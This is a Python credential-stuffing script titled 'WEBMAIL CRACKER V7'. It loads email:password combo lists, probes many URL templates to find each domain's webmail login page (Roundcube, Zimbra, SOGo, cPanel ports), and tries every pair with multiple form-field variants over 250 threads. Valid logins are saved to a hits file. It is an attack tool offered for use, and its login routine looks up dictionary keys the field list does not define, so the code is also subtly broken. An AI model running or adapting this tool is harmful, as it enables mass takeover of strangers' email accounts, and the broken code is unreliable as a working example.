#!/usr/bin/env python3
# coding: utf-8

import os
import re
import ssl
import socket
import threading
import time
import base64
import queue
import requests
import urllib3
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class _N:
        def __getattr__(self, n): return ""
    Fore = Style = _N()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════
THREADS      = 250
SCAN_TIMEOUT = 4      # seconds per URL probe (phase 1)
LOGIN_TIMEOUT = 6     # seconds per login attempt (phase 2)

# ═══════════════════════════════════════════════════════
#  ALL WEBMAIL URL TEMPLATES
#  {d} = domain
#  Tier 1 = most likely, tested first
#  Tier 2 = less common, tested if Tier 1 fails
# ═══════════════════════════════════════════════════════

TIER1_URLS = [
    "https://webmail.{d}/",
    "https://webmail.{d}/login",
    "https://mail.{d}/",
    "https://mail.{d}/login",
    "https://{d}:2096/",
    "https://{d}:2096/login/",
    "http://{d}:2096/",
    "http://{d}:2096/login/",
    "https://{d}/roundcube/",
    "https://{d}/roundcube/index.php",
    "https://webmail.{d}/roundcube/",
    "https://mail.{d}/roundcube/",
    "http://{d}/roundcube/",
    "https://{d}/zimbra/",
    "https://mail.{d}/zimbra/",
    "https://webmail.{d}/zimbra/",
    "https://{d}/SOGo/",
    "https://webmail.{d}/SOGo/",
    "https://{d}/webmail/",
    "https://{d}/webmail/login",
    "https://{d}/mail/",
    "https://{d}/mail/login",
]

TIER2_URLS = [
    "https://webmail.{d}/login/",
    "https://webmail.{d}/index.html",
    "https://webmail.{d}/signin",
    "https://webmail.{d}/signin/",
    "https://webmail.{d}/auth/login",
    "https://webmail.{d}/login/index.html",
    "https://webmail.{d}/login.html",
    "https://webmail.{d}/zimbra/hook/login",
    "https://webmail.{d}/zimbraAuth/",
    "https://mail.{d}/login/",
    "https://mail.{d}/index.html",
    "https://mail.{d}/signin",
    "https://mail.{d}/signin/",
    "https://mail.{d}/zimbra/",
    "https://mail.{d}/zimbra/hook/login",
    "https://mail.{d}/zimbraAuth/",
    "https://mail.{d}/SOGo/",
    "https://mail.{d}/roundcube/",
    "https://mail.{d}/roundcube/index.php",
    "https://mail.{d}/appsuite/login.html",
    "https://mail.{d}/squirrelmail/",
    "https://mail.{d}/iredmail/",
    "https://mail.{d}/horde/",
    "https://mail.{d}/webmail/",
    "https://mail.{d}/webmail/login",
    "https://zimbra.{d}/",
    "https://zimbra.{d}/login",
    "https://zimbra.mail.{d}/",
    "https://zimbra.mail.{d}/login",
    "https://zimbra1.{d}/",
    "https://zimbra1.mail.{d}/",
    "https://zimbra2.{d}/",
    "https://webmail2.{d}/",
    "https://webmail2.{d}/login",
    "https://webmail2.{d}/login/",
    "https://webmails.{d}/",
    "https://webmails.{d}/login",
    "https://webmails.{d}/login/",
    "https://webmail-es.{d}/",
    "https://webmail-es.{d}/login",
    "https://webmail-es.webapps.net/login",
    "https://webmail-es.webapps.net/login.jsp",
    "https://securemail.{d}/",
    "https://securemail.{d}/login",
    "https://securemail.{d}/login/",
    "https://secure.{d}/mail/",
    "https://secure.{d}/mail/login",
    "https://{d}/appsuite/login.html",
    "https://{d}/appsuite/",
    "https://{d}/squirrelmail/",
    "https://{d}/squirrelmail/src/login.php",
    "https://{d}/iredmail/",
    "https://{d}/iredmail/index.php",
    "https://{d}/horde/",
    "https://{d}/horde/imp/login.php",
    "https://{d}/rc/",
    "https://{d}/rc/index.php",
    "https://{d}/login/",
    "https://{d}/signin/",
    "https://{d}/auth/",
    "https://{d}/mail/webmail/",
    "https://{d}/webmail/index.html",
    "https://{d}/webmail/login.html",
    "https://{d}/webmail/signin",
    "https://{d}/mail/webmail/login",
    "https://{d}/imail/",
    "https://{d}/imail/login",
    "https://{d}/maillogin/",
    "https://{d}/login.php",
    "https://{d}/login.jsp",
    "https://{d}/webmail.php",
    "https://{d}/webmail.jsp",
    "http://webmail.{d}/",
    "http://webmail.{d}/login",
    "http://webmail.{d}/login/",
    "http://mail.{d}/",
    "http://mail.{d}/login",
    "http://mail.{d}/login/",
    "http://mail.{d}/zimbra/",
    "http://mail.{d}/roundcube/",
    "http://zimbra.{d}/",
    "http://webmail2.{d}/",
    "http://webmail-es.{d}/login",
    "http://{d}/webmail/",
    "http://{d}/webmail/login",
    "http://{d}/mail/",
    "http://{d}/mail/login",
    "http://{d}/roundcube/",
    "http://{d}/zimbra/",
    "http://{d}/squirrelmail/",
    "http://{d}/SOGo/",
    "http://{d}/appsuite/login.html",
    "http://{d}/login/",
    "http://{d}/signin/",
]

ALL_URLS = TIER1_URLS + TIER2_URLS

# ═══════════════════════════════════════════════════════
#  LOGIN FIELD COMBOS (try in order)
# ═══════════════════════════════════════════════════════
FIELD_COMBOS = [
    {"email":    "email",    "password": "password"},
    {"user":     "email",    "password": "password"},
    {"username": "email",    "password": "password"},
    {"login":    "email",    "password": "password"},
    {"email":    "email",    "passwd":   "password"},
    {"user":     "email",    "pass":     "password"},
    {"username": "email",    "pass":     "password"},
    {"username": "email",    "passwd":   "password"},
    {"Email":    "email",    "Password": "password"},
    {"User":     "email",    "Pass":     "password"},
    {"User_Name":"email",    "Password": "password"},
    {"user_name":"email",    "passwd":   "password"},
    {"mail":     "email",    "password": "password"},
    {"mail":     "email",    "passwd":   "password"},
    {"address":  "email",    "password": "password"},
]

# Extra form fields some panels require
EXTRA_FIELDS = {
    "domain":    "domain",
    "action":    "login",
    "login":     "login",
    "op":        "login",
    "next":      "next",
    "Submit":    "Login",
    "btnLogin":  "Login",
    "logintoken":"",
    "_charset":  "UTF-8",
}

# ═══════════════════════════════════════════════════════
#  SUCCESS INDICATORS
# ═══════════════════════════════════════════════════════
SUCCESS_MARKERS = [
    "welcome",
    "inbox",
    "you're logged in",
    "you are logged in",
    "signed in",
    "logged in",
    "logout",
    "sign out",
    "sign-out",
    "log out",
    "log-out",
    "mailbox",
    "your mail",
    "mail box",
    "unread",
    "sent items",
    "sent folder",
    "drafts",
    "trash",
    "spam folder",
    "junk folder",
    "snooze",
    "compose",
    "new message",
    "write mail",
    "reply",
    "forward",
    "delete mail",
    "empty trash",
]

LOGIN_PAGE_MARKERS = [
    "password",
    "passwd",
    "login",
    "sign in",
    "sign-in",
    "log in",
    "log-in",
    "username",
    "user name",
    "e-mail",
    "email address",
    "your email",
    "your password",
]

# ═══════════════════════════════════════════════════════
#  SHARED STATE
# ═══════════════════════════════════════════════════════
_thread_local = threading.local()
print_lock    = threading.Lock()
file_lock     = threading.Lock()
endpoint_lock = threading.Lock()
dns_lock      = threading.Lock()

dns_cache    = {}       # domain → ip | None
endpoint_map = {}       # domain → url  (working login page)
dead_domains = set()    # domains with no webmail found
cracked      = set()    # emails that cracked

_write_buf   = []
FLUSH_N      = 20
results      = []

def get_session():
    s = getattr(_thread_local, 'sess', None)
    if s is None:
        s = requests.Session()
        s.verify = False
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/125.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })
        _thread_local.sess = s
    return s

def _flush():
    if not _write_buf:
        return
    with file_lock:
        with open("WebMail.txt", "a", encoding="utf-8") as f:
            for line in _write_buf:
                f.write(line + "\n")
    _write_buf.clear()

def save_hit(line):
    _write_buf.append(line)
    results.append(line)
    with print_lock:
        print(Fore.GREEN + Style.BRIGHT +
              f"  ★ {line}" + Fore.RESET, flush=True)
        if len(_write_buf) >= FLUSH_N:
            _flush()

def safe_print(msg):
    with print_lock:
        print(msg, flush=True)

# ═══════════════════════════════════════════════════════
#  DNS CACHE
# ═══════════════════════════════════════════════════════
def dns_resolve(domain):
    with dns_lock:
        if domain in dns_cache:
            return dns_cache[domain]
    try:
        ip = socket.getaddrinfo(domain, 443, socket.AF_INET)[0][4][0]
    except Exception:
        try:
            ip = socket.getaddrinfo(domain, 80, socket.AF_INET)[0][4][0]
        except Exception:
            ip = None
    with dns_lock:
        dns_cache[domain] = ip
    return ip

# ═══════════════════════════════════════════════════════
#  PHASE 1: DISCOVER LOGIN PAGE PER DOMAIN
# ═══════════════════════════════════════════════════════
def probe_url(session, url, domain):
    """
    Check if a URL hosts a login page.
    Returns True if it looks like a webmail login page.
    """
    try:
        r = session.get(url, timeout=SCAN_TIMEOUT, allow_redirects=True)
        if r.status_code in (400, 401, 403, 404, 405, 500, 501, 502, 503, 505):
            return False
        if r.status_code == 302:
            loc = r.headers.get("Location", "").lower()
            if "login" in loc or "signin" in loc or "auth" in loc:
                return True
            return False
        if r.status_code != 200:
            return False

        text_lower = r.text.lower()

        # Must have at least one login marker AND a form or input
        has_login_marker = any(m in text_lower for m in LOGIN_PAGE_MARKERS)
        has_form = ("<form" in text_lower or "<input" in text_lower
                    or "password" in text_lower)

        return has_login_marker and has_form

    except Exception:
        return False


def discover_endpoint(domain):
    """
    Find a working webmail login URL for a domain.
    Tier 1 first, then Tier 2.
    Returns URL string or None.
    """
    session = get_session()

    for tier in (TIER1_URLS, TIER2_URLS):
        for template in tier:
            url = template.replace("{d}", domain)
            if probe_url(session, url, domain):
                return url
    return None


def get_endpoint(domain):
    """
    Thread-safe: return cached endpoint, or discover + cache.
    """
    with endpoint_lock:
        if domain in dead_domains:
            return None
        if domain in endpoint_map:
            return endpoint_map[domain]

    # Not cached – discover (only one thread should do this per domain)
    url = discover_endpoint(domain)

    with endpoint_lock:
        if url:
            endpoint_map[domain] = url
            safe_print(
                Fore.CYAN +
                f"  [+] {domain} → {url}" +
                Fore.RESET
            )
        else:
            dead_domains.add(domain)
            safe_print(
                Fore.RED +
                f"  [-] {domain} → no webmail found" +
                Fore.RESET
            )

    return url

# ═══════════════════════════════════════════════════════
#  PHASE 2: LOGIN ATTEMPT
# ═══════════════════════════════════════════════════════
def check_response(r, email, domain):
    """
    Analyse a POST response for login success.
    Returns True if it looks like a successful login.
    """
    # Redirect to inbox/dashboard = success
    if r.status_code in (301, 302, 303, 307, 308):
        loc = r.headers.get("Location", "").lower()
        success_loc = [
            "inbox", "mail", "home", "dashboard", "folder",
            "sent", "draft", "compose", "message",
        ]
        if any(s in loc for s in success_loc):
            return True
        # Redirect to login page = failure
        if "login" in loc or "signin" in loc or "auth" in loc:
            return False
        # Any other redirect – maybe success, check cookies
        cookies = r.headers.get("Set-Cookie", "").lower()
        if "session" in cookies or "sid" in cookies or "auth" in cookies:
            return True
        return False

    if r.status_code != 200:
        return False

    text_lower = r.text.lower()

    # Strong success markers
    for marker in SUCCESS_MARKERS:
        if marker in text_lower:
            # Must NOT still show a password field
            if "type=\"password\"" not in text_lower.lower() and \
               "type='password'" not in text_lower.lower():
                return True

    # If the page no longer has a login form → likely logged in
    if "type=\"password\"" not in text_lower.lower() and \
       "type='password'" not in text_lower.lower() and \
       "<form" not in text_lower.lower():
        if len(r.text) > 500:
            return True

    return False


def try_login(email, password, url, domain):
    """
    Try logging in with multiple field name combos.
    Returns True on success.
    """
    session = get_session()
    ip = dns_resolve(domain)

    for combo in FIELD_COMBOS:
        data = {
            combo["user_field"]: email,
            combo["pass_field"]: password,
        }
        # Add extra fields for panels that need them
        for k, v in EXTRA_FIELDS.items():
            if k == "domain":
                data[k] = domain
            elif v == "":
                data[k] = ""
            # Only add a few extras to avoid bloating
            if k in ("domain", "op", "action", "login", "next"):
                data[k] = v if v else domain

        try:
            r = session.post(
                url,
                data=data,
                timeout=LOGIN_TIMEOUT,
                allow_redirects=False,
            )
            if check_response(r, email, domain):
                return True
        except Exception:
            continue

    return False


# ═══════════════════════════════════════════════════════
#  WORKER
# ═══════════════════════════════════════════════════════
def worker(combos, done, total):
    for email, pwd, domain in combos:
        if email in cracked:
            with print_lock:
                done[0] += 1
            continue

        url = get_endpoint(domain)

        with print_lock:
            done[0] += 1
            if url is None:
                print(
                    Fore.YELLOW +
                    f"  [SKIP] {email} → {domain} dead" +
                    Fore.RESET, flush=True
                )
            else:
                print(
                    Fore.WHITE +
                    f"  [TRY]  {email}" +
                    Fore.RESET, flush=True
                )

        if url is None:
            continue

        if try_login(email, pwd, url, domain):
            cracked.add(email)
            hit = f"{email}:{pwd} ==> {url} ==> [WebMail Valid]"
            save_hit(hit)
        else:
            with print_lock:
                print(
                    Fore.RED +
                    f"  [FAIL] {email}" +
                    Fore.RESET, flush=True
                )


# ═══════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════
def main():
    os.system("cls" if os.name == "nt" else "clear")

    print(Fore.CYAN + f"""
   WEBMAIL CRACKER  V7  –  FASTEST
   {THREADS} threads | {len(ALL_URLS)} URL templates
   scan:{SCAN_TIMEOUT}s | login:{LOGIN_TIMEOUT}s
   Two-phase: discover endpoint → login
""" + Fore.RESET)
    print(Fore.YELLOW + "=" * 62 + Fore.RESET)

    path = input(Fore.YELLOW + "[+] Combo file: " + Fore.RESET).strip()
    try:
        lines = Path(path).read_text("utf-8", errors="ignore").splitlines()
    except Exception as e:
        print(Fore.RED + f"[!] {e}")
        input("\nPress Enter to exit...")
        return

    # ── load + dedupe + filter ──
    combos = []
    seen   = set()
    skipped = 0
    for ln in lines:
        ln = ln.strip()
        if ":" not in ln:
            continue
        e, p = ln.split(":", 1)
        e, p = e.strip().lower(), p.strip()
        if "@" not in e or not p:
            continue
        dom = e.split("@", 1)[1].strip().lower()
        if not dom or "." not in dom:
            continue
        k = f"{e}:{p}"
        if k in seen:
            continue
        seen.add(k)
        combos.append((e, p, dom))

    total_count = len(combos)
    if not total_count:
        print(Fore.RED + "[!] No valid combos.")
        input("\nPress Enter to exit...")
        return

    unique_domains = list({c[2] for c in combos})

    print(Fore.GREEN +
          f"[+] {total_count} combos | {len(unique_domains)} domains")
    print(Fore.CYAN +
          f"[+] {len(ALL_URLS)} URL templates | "
          f"{len(FIELD_COMBOS)} field combos")

    actual_threads = min(THREADS, total_count)
    print(Fore.CYAN +
          f"[+] Using {actual_threads} threads "
          f"(scan:{SCAN_TIMEOUT}s / login:{LOGIN_TIMEOUT}s)\n")

    # ── split into chunks ──
    chunk_size = max(1, (total_count + actual_threads - 1) // actual_threads)
    chunks = [combos[i:i+chunk_size]
              for i in range(0, total_count, chunk_size)]

    done  = [0]
    t0    = time.time()
    last_print = [0]

    threads = []
    for chunk in chunks:
        t = threading.Thread(
            target=worker, args=(chunk, done, total_count), daemon=True
        )
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    _flush()
    dt = int(time.time() - t0)

    print(Fore.CYAN + "\n" + "=" * 62)
    print(Fore.GREEN + f"  Time     : {dt}s")
    print(Fore.GREEN + f"  Cracked  : {len(cracked)} / {total_count}")
    print(Fore.GREEN + f"  Found    : {len(endpoint_map)}/{len(unique_domains)} domains")
    print(Fore.GREEN + f"  Dead     : {len(dead_domains)} domains")
    print(Fore.GREEN + f"  → WebMail.txt")
    print(Fore.CYAN + "=" * 62)
    input("\nPress Enter to exit...")


if __name__ == "__main__":
    main()
